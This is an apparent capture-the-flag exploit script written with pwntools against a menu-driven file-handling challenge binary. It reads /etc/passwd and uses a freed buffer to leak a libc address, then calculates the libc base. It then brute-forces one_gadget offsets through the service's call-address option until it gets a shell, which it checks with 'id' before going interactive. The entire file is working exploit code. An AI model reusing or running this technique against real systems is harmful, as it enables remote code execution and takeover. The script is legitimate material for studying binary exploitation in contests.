import argparse
from pathlib import Path
import tempfile
import os
import subprocess
from pwn import *
context.terminal = ["kitty"]

context.log_level = 'DEBUG'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()

HOST, PORT = args.address.split(':')

def one_gadget(filename):
    return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

local = False

if local:
    tempdir = tempfile.TemporaryDirectory()
    base_dir = Path(tempdir.name)

    long_tempfile = base_dir / ("A"*11)
    long_tempfile.touch()

    leak_link = base_dir / "link"
    libc_path = '/usr/lib/libc.so.6'
    os.symlink(long_tempfile, leak_link)
else:
    leak_link = '/etc/os-release'
    libc_path = './handout/libc.so.6'


class ChallConn:
    def __init__(self):
        if local:
            self.conn = process('./bin/challenge')
            self.leak_offset = 0x1fe280
        else:
            self.conn = remote(HOST, PORT)
            # calculated for ubuntu 22.04 via running under gdb
            self.leak_offset = 0x21a300

    def __del__(self):
        if hasattr(self, 'conn') and self.conn is not None:
            self.conn.close()

    def load_file(self, path):
        self.conn.sendlineafter(b'>', b'1')
        self.conn.sendlineafter(b'>', path.encode())

    def print_file(self, idx):
        self.conn.sendlineafter(b'>', b'2')
        self.conn.sendlineafter(b'>', str(idx).encode())
        return self.conn.readuntil("Your files:", drop=True)

    def free_file(self):
        self.conn.sendlineafter(b'>', b'3')

    def call_addr(self, addr):
        self.conn.sendlineafter(b'>', b'4')
        self.conn.sendlineafter(b'>', str(addr).encode())

    def calc_libc_base(self, leak):
        return leak - self.leak_offset


# libc_conn = ChallConn()

# libc_conn.load_file(libc_path)
# libc_contents = libc_conn.print_file(0)
# libc_conn.conn.close()

import tempfile
# libcfile = tempfile.NamedTemporaryFile()
# libcfile.write(libc_contents)
libc = ELF(libc_path)

gadgets = one_gadget(libc_path)

print(gadgets)

for g in gadgets:
    conn = ChallConn()

    conn.load_file('/etc/passwd')
    conn.print_file(0)
    conn.free_file()

    conn.load_file(str(leak_link))
    leak_bytes = conn.print_file(0)
    assert len(leak_bytes) > 0, "Leak failed"

    print("Leaked:", leak_bytes)
    leak_addr = int.from_bytes(leak_bytes[8:16], 'little')
    print("Leaked addr:", hex(leak_addr))
    libc_base = conn.calc_libc_base(leak_addr)
    print("libc base:", hex(libc_base))
    assert libc_base % 0x1000 == 0, "Bad libc base"

    conn.call_addr(libc_base + g)
    conn.conn.sendline(b"id")
    try:
        print(conn.conn.read())
        conn.conn.interactive()
    except:
        continue